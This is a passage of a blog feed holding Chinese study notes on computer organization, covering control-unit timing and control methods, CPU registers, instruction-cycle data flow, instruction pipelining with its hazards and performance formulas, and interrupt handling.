src="/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/image_tV5VshyTKJ.png"></p><h3 id="2-1-1-输入信号"><a href="#2-1-1-输入信号" class="headerlink" title="2.1.1 输入信号"></a>2.1.1 输入信号</h3><ol><li><strong>时钟</strong>：为了使控制单元按一定的先后顺序、一定的节奏法出各个控制信号，控制单元必须受时钟控制。</li><li><strong>指令寄存器</strong>：控制信号和操作码有关</li><li><strong>标志</strong>：CU有时需要依赖CPU当前所处的状态产生控制信号</li><li><strong>来自系统总线（控制总线）的控制信号</strong>：如中断请求、DMA请求</li></ol><h3 id="2-1-2-输出信号"><a href="#2-1-2-输出信号" class="headerlink" title="2.1.2 输出信号"></a>2.1.2 输出信号</h3><ol><li><strong>CPU内的控制信号</strong>：用于CPU内的寄存器之间的传送和控制ALU实现不同的操作</li><li><strong>送至系统总线（控制总线）的信号</strong>：例如，命令主存或Ｉ／Ｏ读写、中断响应等</li></ol><h2 id="2-2-多级时序系统"><a href="#2-2-多级时序系统" class="headerlink" title="2.2 多级时序系统"></a>2.2 多级时序系统</h2><h3 id="2-2-1-机器周期"><a href="#2-2-1-机器周期" class="headerlink" title="2.2.1 机器周期"></a>2.2.1 机器周期</h3><p><strong>机器周期</strong>可以看作所有指令执行过程中的一个基准时间，确定机器周期需要考虑<strong>每条指令的执行步骤</strong>和<strong>每一步骤所需的时间</strong>，可以有以下2种确定方式：</p><ol><li>以<strong>完成最复杂指令功能</strong>的时间<strong>为基准</strong></li><li>以<strong>访问一次存储器</strong>的时间<strong>为基准</strong></li></ol><p>由于不论执行什么指令，都需要访问存储器取出指令，因此在存储字长等于指令字长的前提下，取指周期也可以看作机器周期。</p><h3 id="2-2-2-时钟周期"><a href="#2-2-2-时钟周期" class="headerlink" title="2.2.2 时钟周期"></a>2.2.2 时钟周期</h3><p>一个机器周期内可完成若干个微操作，每个微操作需一定的时间，将一个机器周期分成若干个时间相等的<strong>时间段</strong>（节拍、状态、时钟周期）。<strong>时钟周期是控制计算机操作的最小单位时间</strong>，用时钟周期控制产生一个或几个微操作命令。</p><p><img src="/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/image_wOWo5A3zUO.png"></p><h3 id="2-2-3-多级时序系统"><a href="#2-2-3-多级时序系统" class="headerlink" title="2.2.3 多级时序系统"></a>2.2.3 多级时序系统</h3><p>一个指令周期包含若干个机器周期，一个机器周期包含若干个时钟周期。同时，每个指令周期内的机器周期数可以不等，每个机器周期内的时钟周期数也可以不等。</p><p><img src="/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/image_ZtE-EIEIWb.png"></p><p>机器周期、节拍（状态）组成多级时序系统。</p><h3 id="2-2-4-机器速度与机器主频的关系"><a href="#2-2-4-机器速度与机器主频的关系" class="headerlink" title="2.2.4 机器速度与机器主频的关系"></a>2.2.4 机器速度与机器主频的关系</h3><p>机器的<strong>主频</strong>$f$越快，机器的<strong>速度</strong>也越快，在机器周期所含<strong>时钟周期数相同</strong>的前提下，两机<strong>平均指令执行速度之比</strong>等于<strong>两机主频之比</strong>。</p><p>$$<br>\frac{\operatorname{MIPS}<em>{1}}{\operatorname{MIPS}</em>{2}}&#x3D;\frac{f_{1}}{f_{2}}<br>$$</p><p>机器速度不仅与<strong>主频</strong>有关，还与机器周期中所含<strong>时钟周期</strong>（主频的倒数）数以及指令周期中所含的<strong>机器周期数</strong>有关。</p><h2 id="2-3-控制方式"><a href="#2-3-控制方式" class="headerlink" title="2.3 控制方式"></a>2.3 控制方式</h2><p>控制单元控制一条指令执行的过程实质上是依次执行一个确定的微操作序列的过程。通常将如何形成控制不同微操作序列所采用的时序控制方式称为<strong>CU的控制方式</strong>。</p><p>常见的有同步控制、异步控制、联合控制和人工控制。</p><h3 id="2-3-1-同步控制"><a href="#2-3-1-同步控制" class="headerlink" title="2.3.1 同步控制"></a>2.3.1 同步控制</h3><p>同步控制方式是指任一微操作均由<strong>统一基准时标</strong>的时序信号控制，每一个微操作都是事先确定的。</p><p><img src="/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/image_j0D_w9HWO_.png"></p><p>在同步控制中，又划分为三种方案。</p><h4 id="2-3-1-1-定长的机器周期"><a href="#2-3-1-1-定长的机器周期" class="headerlink" title="2.3.1.1 定长的机器周期"></a>2.3.1.1 定长的机器周期</h4><p>以<strong>最长</strong>的<strong>微操作序列</strong>和<strong>最繁</strong>的微操作作为<strong>标准</strong>机器周期，每个机器周期内的<strong>节拍数相同</strong>。</p><h4 id="2-3-1-2-不定长的机器周期"><a href="#2-3-1-2-不定长的机器周期" class="headerlink" title="2.3.1.2 不定长的机器周期"></a>2.3.1.2 不定长的机器周期</h4><p>采用这种方案时，每个机器周期内的节拍数可以不等。</p><p><img src="/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/image_j4b76UUw_d.png"></p><h4 id="2-3-1-3-中央控制和联合控制结合"><a href="#2-3-1-3-中央控制和联合控制结合" class="headerlink" title="2.3.1.3 中央控制和联合控制结合"></a>2.3.1.3 中央控制和联合控制结合</h4><p>这种方案将机器的大部分指令安排在统一的、较短的机器周期内完成，称为<strong>中央控制</strong>，而将少数操作复杂的指令中的某些操作采用<strong>局部控制</strong>方式。</p><p><img src="/2024/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC9%E7%AB%A0%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E7%9A%84%E5%8A%9F%E8%83%BD/image_e_77aft_8t.png"></p><h3 id="2-3-2-异步控制方式"><a href="#2-3-2-异步控制方式" class="headerlink" title="2.3.2 异步控制方式"></a>2.3.2 异步控制方式</h3><p>异步控制方式不存在基准时标信号，没有固定的周期节拍和严格的时钟同步，执行每条指令和每个操作需要多少时间就占用多少时间。</p><p>因此需要采用各种应答电路，故其结构比同步控制方式更加复杂。</p><h3 id="2-3-3-联合控制方式"><a href="#2-3-3-联合控制方式" class="headerlink" title="2.3.3 联合控制方式"></a>2.3.3 联合控制方式</h3><p>同步控制和异步控制相结合就是<strong>联合控制方式</strong>。</p><h3 id="2-3-4-人工控制方式"><a href="#2-3-4-人工控制方式" class="headerlink" title="2.3.4 人工控制方式"></a>2.3.4 人工控制方式</h3><p><strong>人工控制</strong>是为了调机和软件开发的需要，在机器面板或内部设置一些开关或按键，来达到人工控制的目的。</p><ol><li>Reset（复位）键</li><li>连续或单条执行转换开关</li><li>符合停机开关</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理第8章：CPU的结构和功能</title>
      <link href="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/"/>
      <url>/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="1-CPU的结构"><a href="#1-CPU的结构" class="headerlink" title="1 CPU的结构"></a>1 CPU的结构</h1><h2 id="1-1-CPU的功能"><a href="#1-1-CPU的功能" class="headerlink" title="1.1 CPU的功能"></a>1.1 CPU的功能</h2><p>CPU实质包括运算器和控制器两大部分。控制器负责协调并控制计算机各部件执行程序的指令序列，其基本功能是取指令、分析指令和执行指令。</p><p><strong>简述CPU的功能如下</strong>：</p><ol><li>CPU具有控制程序的顺序执行，<strong>即指令控制</strong></li><li>产生完成每条指令所需的控制命令，<strong>即操作控制</strong></li><li>对各种操作实施时间上的控制，<strong>即时间控制</strong></li><li>对操作数进行算术运算和逻辑运算，<strong>即数据加工</strong></li><li><strong>处理中断</strong></li></ol><h2 id="1-2-CPU的结构框图"><a href="#1-2-CPU的结构框图" class="headerlink" title="1.2 CPU的结构框图"></a>1.2 CPU的结构框图</h2><p>指令控制需要：寄存器、控制单元CU；数据加工需要：ALU；中断控制需要：中断系统。此外，还需要系统总线，即控制总线、地址总线和数据总线。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_1O8uCB4gGp.png"></p><h2 id="1-3-CPU的寄存器"><a href="#1-3-CPU的寄存器" class="headerlink" title="1.3 CPU的寄存器"></a>1.3 CPU的寄存器</h2><p>CPU的寄存器大致可分为两类：</p><ol><li>一类属于用户可见寄存器，用户可以这类寄存器编程。</li><li>另一类属于控制和状态寄存器，用户不可对这类寄存器编程，它们被控制部件使用，以控制CPU的操作。</li></ol><h3 id="1-3-1-用户可见寄存器"><a href="#1-3-1-用户可见寄存器" class="headerlink" title="1.3.1 用户可见寄存器"></a>1.3.1 用户可见寄存器</h3><ol><li><strong>通用寄存器</strong>：可由程序设计者指定许多功能，可用于存放操作数，也可作为满足某种寻址方式所需的寄存器。</li><li><strong>数据寄存器</strong>：用于存放操作数。</li><li><strong>地址寄存器</strong>：用于存放地址，其位数应满足最大的地址范围。</li><li><strong>条件码寄存器</strong>：存放条件码，可作程序分支的依据，例如正、负、零、溢出、进位等。</li></ol><h3 id="1-3-2-控制和状态寄存器"><a href="#1-3-2-控制和状态寄存器" class="headerlink" title="1.3.2 控制和状态寄存器"></a>1.3.2 控制和状态寄存器</h3><p>CPU中还有一类寄存器用于控制CPU的操作或运算，如以下四种寄存器：</p><ol><li><strong>MAR</strong>：存储器地址寄存器，用于存放将被访问的存储单元的地址</li><li><strong>MDR</strong>：存储器数据寄存器，用于存放欲存入存储器中的数据或最近从存储器中读出的数据</li><li><strong>PC</strong>：程序计数器，存放现行指令的地址，通常具有计数功能</li><li><strong>IR</strong>：指令寄存器，存放当前欲执行的指令</li></ol><h2 id="1-4-控制单元-CU-和中断系统"><a href="#1-4-控制单元-CU-和中断系统" class="headerlink" title="1.4 控制单元 CU 和中断系统"></a>1.4 控制单元 CU 和中断系统</h2><p>控制单元（CU）是提供完成计算机全部指令操作的微操作命令序列部件。微操作命令序列的形成方法有两种：</p><ol><li>组合逻辑设计方法</li><li>微程序设计方法</li></ol><p>中断系统主要用于处理计算机的各种中断。</p><hr><h1 id="2-指令周期"><a href="#2-指令周期" class="headerlink" title="2 指令周期"></a>2 指令周期</h1><h2 id="2-1-基本概念"><a href="#2-1-基本概念" class="headerlink" title="2.1 基本概念"></a>2.1 基本概念</h2><p>CPU每取出并执行一条指令所需的全部时间称为<strong>指令周期</strong>。由于各种指令操作功能不同，因此各种指令的指令周期是不相同的。</p><p>一个完整的指令周期应包括取值、间址、执行和中断4个子周期。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_LeHggw3om8.png"></p><p>设置CPU工作周期标志触发器对设计控制单元十分有利。</p><h2 id="2-2-指令周期的数据流"><a href="#2-2-指令周期的数据流" class="headerlink" title="2.2 指令周期的数据流"></a>2.2 指令周期的数据流</h2><h3 id="2-2-1-取值周期数据流"><a href="#2-2-1-取值周期数据流" class="headerlink" title="2.2.1 取值周期数据流"></a>2.2.1 取值周期数据流</h3><p>PC中存放现行指令的地址，该地址送到MAR并送至地址总线，然后由控制部件CU向存储器发读命令，使对应MAR所指单元的内容（指令）经数据总线送至MDR，再送至IR，并且CU控制PC内容加1，形成下一条指令的地址。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_sBJY67zGPA.png"></p><h3 id="2-2-2-间址周期数据流"><a href="#2-2-2-间址周期数据流" class="headerlink" title="2.2.2 间址周期数据流"></a>2.2.2 间址周期数据流</h3><p>一旦取指周期结束，CU便检查IR中的内容，以确定其是否有间址操作，如果需要间址操作，则MDR中指示形式地址的右N位（记作$Ad(MDR)$）将被送到MAR，又送至地址总线，此后CU向存储器发读命令，以获得有效地址并存至MDR。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image__GPPJzuymx.png"></p><h3 id="2-2-3-执行周期的数据流"><a href="#2-2-3-执行周期的数据流" class="headerlink" title="2.2.3 执行周期的数据流"></a>2.2.3 执行周期的数据流</h3><p>由于不同的指令在执行周期的操作不同，因此执行周期的数据流是多种多样的，可能涉及CPU内部寄存器间的数据传送、对存储器（或I&#x2F;O）进行读写操作或对ALU的操作。</p><h3 id="2-2-4-中断周期的数据流"><a href="#2-2-4-中断周期的数据流" class="headerlink" title="2.2.4 中断周期的数据流"></a>2.2.4 中断周期的数据流</h3><p>CPU进入中断周期要完成一系列操作，其中PC当前的内容必须保存起来，以待执行完中断服务程序后可以准确返回到该程序的间断处。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_uadilPQ1fP.png"></p><p>CU把用于保存程序断点的存储器特殊地址送往MAR，并送到地址总线上，然后由CU向存储器发写命令，并将PC的内容（程序断点）送到MDR，最终使程序断点经数据总线存入存储器。</p><p>此外，CU还需将中断服务程序的入口地址送至PC，为下一个指令周期的取指周期做好准备。</p><hr><h1 id="3-指令流水"><a href="#3-指令流水" class="headerlink" title="3 指令流水"></a>3 指令流水</h1><p>如何提高机器速度？</p><ol><li>提高访存速度：高速芯片、Cache、多体并行</li><li>提高 I&#x2F;O 和主机之间的传送速度：中断、DMA、通道、I&#x2F;O 处理机、多总线</li><li>提高运算器速度：高速芯片、改进算法、快速进位链</li><li><strong>提高整机处理能力：高速器件、改进系统结构 ，开发系统的并行性</strong></li></ol><p>所谓并行，包含同时性和并发性两个方面。</p><ul><li>同时性：两个或两个以上事件在<strong>同一时刻</strong>发生</li><li>并发性：两个或两个以上事件在<strong>同一时间段</strong>发生</li></ul><h2 id="3-1-指令流水原理"><a href="#3-1-指令流水原理" class="headerlink" title="3.1  指令流水原理"></a>3.1  指令流水原理</h2><p>为了进一步提高处理速度，可将指令的处理过程分解为更细的几个阶段：</p><ol><li><strong>取值（FI）</strong>：从存储器取出一条指令并暂时存入指令部件的缓冲区</li><li><strong>指令译码（DI）</strong>：确定操作性质和操作输地址的形成方式</li><li><strong>计算操作数地址（CO）</strong>：计算操作数的有效地址</li><li><strong>取操作数（FO）</strong>：从存储器中取操作数（若操作数在寄存器中，则无需此操作）</li><li><strong>执行指令（EI）</strong>：执行指令所需的操作，并将结果存于目的寄存器</li><li>写操作数（WO）：将结果存入存储器</li></ol><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_zymAKkTxha.png"></p><h2 id="3-2-影响指令流水线性能的因素"><a href="#3-2-影响指令流水线性能的因素" class="headerlink" title="3.2 影响指令流水线性能的因素"></a>3.2 影响指令流水线性能的因素</h2><p>流水线在流动过程中通常会出现三种相关，即结构相关、数据相关和控制相关。</p><h3 id="3-2-1-结构相关"><a href="#3-2-1-结构相关" class="headerlink" title="3.2.1 结构相关"></a>3.2.1 结构相关</h3><p><strong>结构相关</strong>是当指令在重叠执行过程中，不同指令争用同一功能部件产生资源冲突时产生的，故又有<strong>资源相关</strong>之称。</p><p>解决方法：</p><ol><li>暂停一个时钟周期</li><li>设置两个独立的存储器分别存放操作数和指令，以免取指令和取操作数同时进行时互相冲突</li></ol><h3 id="3-2-2-数据相关"><a href="#3-2-2-数据相关" class="headerlink" title="3.2.2 数据相关"></a>3.2.2 数据相关</h3><p><strong>数据相关</strong>是流水线中的各条指令因重叠操作，可能改变对操作数的读写访问顺序，从而导致了数据相关冲突。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_QxpeuaXc4q.png"></p><p>解决方法：</p><ol><li><strong>后推法</strong>：遇到数据相关时，停顿后续指令的运行，直到前面指令的结果已经生成</li><li><strong>数据旁路</strong>：直接将执行结果送到其他指令所需要的地方</li></ol><h3 id="3-2-3-控制相关"><a href="#3-2-3-控制相关" class="headerlink" title="3.2.3 控制相关"></a>3.2.3 控制相关</h3><p>控制相关主要是由转移指令引起的。可以采用尽早判别转移是否发生，尽早生成转移目标地址；</p><h2 id="3-3-流水线性能"><a href="#3-3-流水线性能" class="headerlink" title="3.3 流水线性能"></a>3.3 流水线性能</h2><p>流水线性能通常用吞吐率、加速比和效率3项指标来衡量。</p><h3 id="3-3-1-吞吐率"><a href="#3-3-1-吞吐率" class="headerlink" title="3.3.1 吞吐率"></a>3.3.1 吞吐率</h3><p>吞吐率是指在单位时间内<strong>流水线所完成指令</strong>或<strong>输出结果</strong>的<strong>数量</strong>，又分为最大吞吐率和实际吞吐率。</p><p><strong>最大吞吐率</strong>是指流水线在连续流动达到稳定状态后所获得的吞吐率，对于$m$段的指令流水线而言，若各段的时间均为$\Delta t$，则最大吞吐率为：</p><p>$$<br>T_{pmax}&#x3D;\frac{1}{\Delta t}<br>$$</p><p><strong>实际吞吐率</strong>是指流水线完成$n$条指令的实际吞吐率，故实际吞吐率的计算公式为：</p><p>$$<br>T_{p}&#x3D;\frac{n}{m \cdot \Delta t+(n-1) \cdot \Delta t}<br>$$</p><h3 id="3-3-2-加速比-S-p"><a href="#3-3-2-加速比-S-p" class="headerlink" title="3.3.2 加速比$S_p$"></a>3.3.2 加速比$S_p$</h3><p><strong>加速比</strong>是指$m$段的流水线的速度与等功能的<strong>非流水线的速度</strong>之比，加速比的计算公式如下：</p><p>$$<br>S_{p}&#x3D;\frac{n m \cdot \Delta t}{m \Delta t+(n-1) \Delta t}&#x3D;\frac{n m}{m+n-1}<br>$$</p><h3 id="3-3-3-效率"><a href="#3-3-3-效率" class="headerlink" title="3.3.3 效率"></a>3.3.3 效率</h3><p><strong>效率</strong>是指流水线中各功能段的<strong>利用率</strong>。因为流水线有建立时间和排空时间，因此各功能段的设备不可能一直处于工作状态，总有一段空闲时间。通常用流水线各段处于工作时间的时空区与流水线中各段总的时空区纸币来衡量流水线的效率。用公式表示为：</p><p>$$<br>E&#x3D;\frac{mn\Delta t}{m(m+n-1)\Delta t}&#x3D;\frac{n}{m+n-1}&#x3D;\frac{S_p}{m}&#x3D;T_p \Delta t<br>$$</p><h2 id="3-4-流水线的多发技术"><a href="#3-4-流水线的多发技术" class="headerlink" title="3.4 流水线的多发技术"></a>3.4 流水线的多发技术</h2><p>为了进一步发展，还可开发流水线中的多发技术，设法在一个时钟周期（机器主频的到数）内产生更多条指令的结果。</p><p>常见的多发技术有超标量技术、超流水线技术和超长指令字技术。</p><h3 id="3-4-1-超标量技术"><a href="#3-4-1-超标量技术" class="headerlink" title="3.4.1 超标量技术"></a>3.4.1 超标量技术</h3><p>超标量技术是指每个时钟周期内可<strong>并发多条独立指令</strong>，即以并行操作方式将两条或两条以上的指令编译执行。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_niWOob2Kid.png"></p><p>超标量计算机不能重新安排指令的执行顺序，但可以通过编译优化技术，在高级语言翻译成机器语言时精心安排，把能并行执行的指令搭配起来，挖掘更多的指令并行性。</p><h3 id="3-4-2-超流水线技术"><a href="#3-4-2-超流水线技术" class="headerlink" title="3.4.2 超流水线技术"></a>3.4.2 超流水线技术</h3><p>超流水线技术是将一些流水线寄存器插入流水线段中，好比将流水线再分段。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_YBiJjDwG4A.png"></p><h3 id="3-4-3-超长指令字技术"><a href="#3-4-3-超长指令字技术" class="headerlink" title="3.4.3 超长指令字技术"></a>3.4.3 超长指令字技术</h3><p>超长指令字技术是由编译程序<strong>挖掘</strong>出指令间<strong>潜在</strong>的<strong>并行性</strong>后，将<strong>多条</strong>能<strong>并行操作</strong>的指令组合成一条具有<strong>多个操作码字段</strong>的<strong>超长指令字</strong>（可达几百位）。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_bHTGB9RRAj.png"></p><p>超长指令字较超标量具有更高的并行处理能力，但对优化编译器的要求更高，对Cache的容量要求更大。</p><hr><h1 id="4-中断系统"><a href="#4-中断系统" class="headerlink" title="4 中断系统"></a>4 中断系统</h1><p>为了处理各种中断，CPU内通常设有处理中断的机构——中断系统，以解决各种中断的共性问题。</p><p>引起中断的各种因素如下：</p><ol><li>人为设置的中断：一般称为<strong>自愿中断</strong></li><li>程序性事故：如定点溢出、浮点溢出等，属于由程序设计不周而引起的 中断</li><li>硬件故障</li><li>I&#x2F;O设备</li><li>外部事件：例如键盘输入</li></ol><p>中断源可分两大类：不可屏蔽中断和可屏蔽中断。</p><p>中断系统需要解决的问题：</p><ol><li>各中断源<strong>如何</strong>向 CPU** 提出请求**？</li><li>各中断源同时提出请求怎么办 ？</li><li>CPU什么条件、什么时间、以什么方式响应中断？</li><li>如何保护现场？</li><li>如何寻找入口地址？</li><li>如何恢复现场，如何返回？</li><li>处理中断的过程中又出现新的中断怎么办？</li></ol><h2 id="4-1-中断请求标记和中断判优逻辑"><a href="#4-1-中断请求标记和中断判优逻辑" class="headerlink" title="4.1 中断请求标记和中断判优逻辑"></a>4.1 中断请求标记和中断判优逻辑</h2><h3 id="4-1-1-中断请求标记"><a href="#4-1-1-中断请求标记" class="headerlink" title="4.1.1 中断请求标记"></a>4.1.1 中断请求标记</h3><p>为了判断是哪个中断源提出请求，在中断系统中必须设置中断请求标记触发器，简称<strong>中断请求触发器</strong>，记作INTR。多个INTR可以组成中断请求标记寄存器。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_Q2gSJOqfLe.png"></p><p>尽管中断请求标记寄存器是由各中断触发器组成的，但这些触发器可以集中在CPU的中断系统内，也可以分散到各个中断源。</p><h3 id="4-1-2-中断判优逻辑"><a href="#4-1-2-中断判优逻辑" class="headerlink" title="4.1.2 中断判优逻辑"></a>4.1.2 中断判优逻辑</h3><p>当某一个时刻有多个中断源提出中断请求时，中断系统必须按其优先顺序予以响应，这称为<strong>中断判优</strong>。</p><h4 id="4-1-2-1-硬件排队"><a href="#4-1-2-1-硬件排队" class="headerlink" title="4.1.2.1 硬件排队"></a>4.1.2.1 硬件排队</h4><p>分为两种，一种是链式排队器，对应中断请求触发器分散在各个接口电路中的情况。</p><p>另一种排队器设在CPU内，如下图所示：</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_d0HzBNgvGO.png"></p><h4 id="4-1-2-2-软件排队"><a href="#4-1-2-2-软件排队" class="headerlink" title="4.1.2.2 软件排队"></a>4.1.2.2 软件排队</h4><p>软件排队通过编写查询程序实现的，程序按一下逻辑从高至低逐级查询各中断源是否有中断请求，这样可以保证CPU首先响应级别高的中断源的请求。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_qsRsm9T3A2.png"></p><h2 id="4-2-中断服务程序入口地址的寻找"><a href="#4-2-中断服务程序入口地址的寻找" class="headerlink" title="4.2 中断服务程序入口地址的寻找"></a>4.2 中断服务程序入口地址的寻找</h2><h3 id="4-2-1-硬件向量法"><a href="#4-2-1-硬件向量法" class="headerlink" title="4.2.1 硬件向量法"></a>4.2.1 硬件向量法</h3><p><strong>硬件向量法</strong>就是利用硬件产生向量地址，再由向量地址找到中断服务程序的入口地址。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_dWKli0jhj-.png"></p><h3 id="4-2-2-软件查询法"><a href="#4-2-2-软件查询法" class="headerlink" title="4.2.2 软件查询法"></a>4.2.2 软件查询法</h3><p>用软件寻找中断服务程序入口地址的方法称为<strong>软件查询法</strong>。当查到某一中断源有中断请求时，接着安排一条转移指令，直接指向此中断源的中断服务程序入口地址。</p><p><img src="/2024/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%AC%AC8%E7%AB%A0%EF%BC%9ACPU%E7%9A%84%E7%BB%93%E6%9E%84%E5%92%8C%E5%8A%9F%E8%83%BD/image_bxA6NkeVLh.png"></p><h2 id="4-3-中断响应"><a href="#4-3-中断响应" class="headerlink" title="4.3 中断响应"></a>4.3 中断响应</h2><h3 id="4-3-1-响应中断的条件"><a href="#4-3-1-响应中断的条件" class="headerlink" title="4.3.1 响应中断的条件"></a>4.3.1 响应中断的条件</h3><p>CPU响应I&#x2F;O中断的条件是允许中断触发器必须为“1”。在中断系统中有一个允许中断触发器EINT，它可被开中断指令置“1”，也可被关中断指令置“0”。即只有当$EINT&#x3D;1$并且有中断请求时，CPU可以响应中断。</p><h3 id="4-3-2-响应中断的时间"><a href="#4-3-2-响应中断的时间" class="headerlink" title="4.3.2 响应中断的时间"></a>4.3.2 响应中断的时间</h3><p>在指令执行周期结束后，若有中断，CPU则进入中断周期；若无中断，则进入下一条指令的取值周期。</p><h3 id="4-3-3-中断隐指令"><a href="#4-3-3-中断隐指令" class="headerlink" title="4.3.3 中断隐指令"></a>4.3.3 中断隐指令</h3><p>CPU响应中断后，即进入中断周期。在中断周期内，CPU要自动完成一系列操作，具体如下：</p><ol><li><strong>保护程序断点</strong>：将PC的内容保存到存储器中，可以存在特定单元（0号地址），也可以存入堆栈</li><li><strong>寻找中断服务程序的入口地址</strong>：有硬件向量法和软件查询法两种</li><li><strong>关中断</strong>：INT为状态“1”，同时$EINT&#x3D;0$</li></ol><h2 id="4-4-保护现场和恢复现场"><a 